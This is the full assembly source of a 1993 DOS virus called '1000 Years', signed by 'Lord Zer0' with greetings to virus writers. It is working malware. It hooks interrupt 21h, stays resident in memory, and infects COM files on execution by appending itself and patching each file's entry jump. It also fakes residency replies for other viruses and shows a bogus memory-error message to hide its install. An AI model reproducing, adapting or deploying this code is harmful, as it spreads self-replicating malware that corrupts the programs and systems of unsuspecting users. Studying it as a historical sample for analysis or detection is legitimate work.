;************************
;*          *
;*  1 0 0 0  Y E A R S  *
;*          *
;*     by Lord Zer0 *
;*          *
;*     18-SEP-1993  *   
;*          *
;*     version 1.00x    *
;*          *
;************************

; Blessed is he who expects nothing, for shall not be disappointed..........

; I wish I have make this program 1988.
; Then I whould be famous as the Dark Avenger.
; The Cop got him 1992 and take his Virus eXchange BBS...

; DISCLAIMER: The author does not take any responsability for any damage,
; either direct or implied, caused by the usage or not of this source or of
; the resulting code after assembly. No warrant is made about the product
; functionability or quality.

; I have made some anti Virus rutins in this prg.
; (What!! That's not right we must fight together!)
; But I want to rule the PC by my self.
; many virus are fight off (I have more than 300 files with Virus and trojans.)
; When the Invader virus is runnig the system will crass.
 
; I'm 15th years old and living in Stockholm, Sweden.
; Greetings to all virus writers!
; and specially the Dark Avenger

        title   "The 1000 Years Virus written by -=Lord Zer0=-"

Main        segment byte
        assume  cs:Main,ds:Main,es:main,ss:nothing
        org 100h
Start       label   near
        call    goon
goon:       pop bp
        sub bp,offset goon
        jmp install
new_jmp     db  0,0,0
buffer      db  090h,0CDh,020h
old_Int_21h dw  0,0
Tsr_Err     dw  0,0
fake        db  0dh,0ah,'Memory allocatesion error',0dh,0ah
        db  'Please try again',0dh,0ah,'$'
years       db  ' 1000 Years....'
Int_21h     proc    near
        pushf
        cmp ax,4B04h        ;MG-1
        je  cs:mg1
        cmp ax,0C603h
        je  cs:mg1          ;Yankee doodle
        cmp ax,6969h
        je  cs:datarape11       ;Data Rape 1.1
        cmp ax,7BCDh
        je  cs:evilgenius       ;Evil Genius 2.0
        cmp ax,0B56h
        je  cs:Perfume      ;Perfume
        cmp ax,4243h
        je  cs:Invader      ;Invader
        cmp ax,0d5AAh
        je  cs:dir          ;Dir
        cmp ax,4b4dh
        je  cs:mg1      ;Fool the An
        cmp ax,4BDDh
        je  cs:Zer
        cmp ah,0E0h
        je  cs:am1
        cmp ah,0E1h
        je  cs:am2
        cmp ax,04BFFh
        je  cs:Justice
        cmp ax,0C500h
        je  cs:Hymn
        cmp ax,4203h
        je  cs:Shake
        cmp ah,090h
        je  cs:Carioca
        cmp ax,04B4Dh
        je  cs:mg1
        cmp ax,0FFFFh
        je  cs:Ontario
        cmp ah,4bh
        je  cs:infect
        cmp ax,3015h
        jne cs:Return
        mov bx,ax       ; This virus check mov ah,30 int 21h
mg1:                    ; is get dos ver but I load al,15h
        popf            ; and get a the if resident mov bx,ax
        iret
return:
        popf
        jmp dword ptr cs:[old_int_21h]
Wonder      db  'It',39,'s a wonder if the Earth will survive 1000 years with Human...'
Ontario:
        inc ah
        popf
        iret
hymn:
        mov ax,6731h
        popf
        iret
Zer:
        mov ax,1234h
        popf
        iret
Shake:
        mov ax,1234h
        popf
        iret
Carioca:
        mov ah,1h
        popf
        iret
am1:
        mov ax,0DADAh
        popf
        iret
am2:
        mov ax,cs
        popf
        iret
Justice:
        mov di,055AAh
        popf
        iret
Perfume:
        mov ax,4952h
        popf
        iret
invader:
        mov ax,5678h
        popf
        iret
dir:
        cmp bp,0DEAAh
        jne cs:damage
        mov si,4321h
        mov bp,9876h
        popf
        iret
Damage:
        mov ax,2A03h
        popf
        iret
Evilgenius:
        mov bx,ax
        popf
        iret
datarape11:
        mov ax,0666h
        popf
        iret
infect:
        push    ax          ; Save the registers
        push    bx
        push    cx
        push    dx

        push    si
        push    di
        push    es
        push    ds
        push    bp
        
        mov ax,4300h
        int 21h
        jc  cs:nofile
        push    cx

        mov ax,4301h
        xor cx,cx
        int 21h

        mov ax,3D02h
        int 21h
        jc  cs:nofile
        mov bx,ax
        push    ds
        push    dx
        push    cs
        pop ds

        mov ah,3fh
        mov dx,offset ds:buffer
        mov cx,3
        int 21h

        cmp word ptr ds:[buffer],09090h ;If the file is a trap
        je  cs:close            ;then quit
        cmp word ptr ds:[buffer],'ZM'   ;If the file is a EXE
        je  cs:close            ;then quit

        mov ax,4202h            
        xor dx,dx
        xor cx,cx
        int 21h

        sub ax,offset the_end-offset Start+3
        jc  cs:close            ;It's to small
        cmp word ptr ds:buffer+1,ax
        je  cs:close            ;It's already infect
        add ax,offset the_end-offset Start
        mov word ptr ds:new_jmp+1,ax
        mov byte ptr ds:new_jmp,0E9h

        mov ah,40h
        mov dx,offset ds:[100h]
        mov     cx,offset the_end-offset Start
        int 21h
        jc  cs:close

        mov ax,4200h
        xor cx,cx
        xor dx,dx
        int 21h

        mov ah,40h
        mov dx,offset ds:new_jmp
        mov cx,3
        int 21h
        jc  cs:close
close:
        mov ax,5700h
        int 21h
        inc al
        int 21h

        mov ah,3eh
        int 21h
        pop dx
        pop ds

        mov ax,4301h
        pop cx
        int 21h

nofile:
        pop bp
        pop ds
        pop es
        pop di
        pop si

        pop dx
        pop cx
        pop bx
        pop ax

        popf
        jmp dword ptr cs:[old_int_21h]
int_21h     endp
        db  'I',39,'m 15th..'
Install:
        push    ax          ; Save the registers
        push    bx
        push    cx
        push    dx
        push    si
        push    di
        push    bp
        push    es
        push    ds
        mov al,15h
        mov ah,30h
        int 21h
        cmp ax,bx
        jne maketsr
returner:
        mov di,0100h
        mov si,offset buffer
        add si,bp
        movsw
        movsb
        pop ds
        pop es
        pop bp
        pop di
        pop si
        pop dx
        pop cx
        pop bx
        pop ax
        mov bp,0100h
        jmp bp
copyright:
    db  'This program was written in the city of Stockholm '
    db  '(C) 1993 -=Lord Zer0=-',0
maketsr:
        mov ah,48h
        mov bx,0FFFFh
        int 21h

        sub bx,0010h
        mov ah,48h
        int 21h

        mov es,ax
        mov ah,49h
        int 21h

        mov ah,34h
        int 21h
        mov word ptr [tsr_err+bp],bx
        mov word ptr [tsr_err+2+bp],es

        mov ax,3521h
        int 21h
        mov word ptr [old_int_21h+bp],bx
        mov word ptr [old_int_21h+2+bp],es

        mov ax,2521h
        mov dx,offset Int_21h
        add dx,bp
        int 21h

        mov ah,9
        mov dx,offset fake
        add dx,bp
        int 21h

        mov dx,offset the_end
        add dx,bp
        mov cl,4
        shr dx,cl
        add dx,4
        mov ax,3100h
        int 21h
;Now it's the begining of a blind life in the memory...
the_end:
Main        ends
        end start
